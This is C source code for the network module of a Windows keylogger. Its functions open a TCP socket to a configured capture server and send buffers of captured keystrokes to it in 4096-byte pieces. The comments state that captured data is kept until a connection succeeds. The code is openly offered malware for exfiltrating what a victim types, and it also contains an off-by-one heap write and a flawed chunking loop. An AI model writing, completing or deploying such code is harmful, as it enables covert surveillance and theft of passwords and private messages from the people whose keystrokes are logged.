#include "KeyLogger_clientCom.h"

#include <stdio.h>
#include <winsock2.h>
WSADATA WSA;
SOCKET keylogServer;
 /**
    Name startListeningClient

    Description: enable the server to write to t he socket  by calling
    a WSASartup to enable SOCKET communication, then initiate
    the socket. if the socket is established this function should
    return true, else this function should return false.
*/
bool startListeningClient()
{
    /*
        create the structure to store server level socket information
    */
    struct sockaddr_in server;

    /*
        if the windows socket does not start then return false so data collected
        by this keylogger may persist until the next time a connection is established.
    */
    if (WSAStartup(MAKEWORD(2,2),&WSA) !=0)
    {
        return false;
    }
    /*
        define a socket used for communication by this key-logger back to the capture
        server.
    */
    keylogServer = socket(AF_INET,SOCK_STREAM,0);
    /*
        if the socket registered is invalid then return false so that the data captured
        may persist until a connection can be established.
    */
    if (keylogServer == INVALID_SOCKET)
    {
        return false;
    }
    /*
        define the port, ip address, and protocol family this client should
        communicate on.
    */
    server.sin_port=htons(SERVER_CONNECTION_PORT);
    server.sin_family=AF_INET;
    server.sin_addr.S_un.S_addr = inet_addr(IP_ADDRESS);
    /*
        if the connection fails, return false so that a new attempt can be
        established on the next iteration.
    */
    if (connect(keylogServer,(SOCKADDR*)&server,sizeof(server))<0)
    {
        return false;
    }
    /*
        everything succeeded, return true;
    */
return true;
}
/**
    Mockup the writeToServer function for further development at this point it is limited
    but will be developed further.

    TODO:  break messages down into 4096 byte capturesti
    TODO:  write extensive documenta

    Title WriteToServer
*/

bool WriteToServer(const char* buffer)
{
    if(strlen(buffer)>0x1000)
    {
        char* temp = (char*)malloc(0x1000);
        for(int x=0; (strlen(buffer)-(x*0x1000))>0;x++)
        {
            if(strlen(buffer+(x*0x1000))>0x1000)
                {
                    memset(temp,0,0x1000);
                    memcpy(temp,buffer+(x*0x1000),0x1000);
                    *(temp+0x1000)=0x00;
                    if (send(keylogServer,temp,0x1000,0) ==SOCKET_ERROR)
                        return false;

                }
            else
                {

                    memset(temp,0,0x1000);
                    memcpy(temp,buffer+(x*0x1000),strlen(buffer+(x*0x1000))+1);
                    if (send(keylogServer,temp,strlen(temp)+1,0) ==SOCKET_ERROR)
                        return false;
                    printf("%s",temp);
                    return true;
                }
            printf("%s",temp);
        }
    }
    else
    {
    if (send(keylogServer,buffer,strlen(buffer)+1,0) ==SOCKET_ERROR)
        return false;
    }
    return true;
}

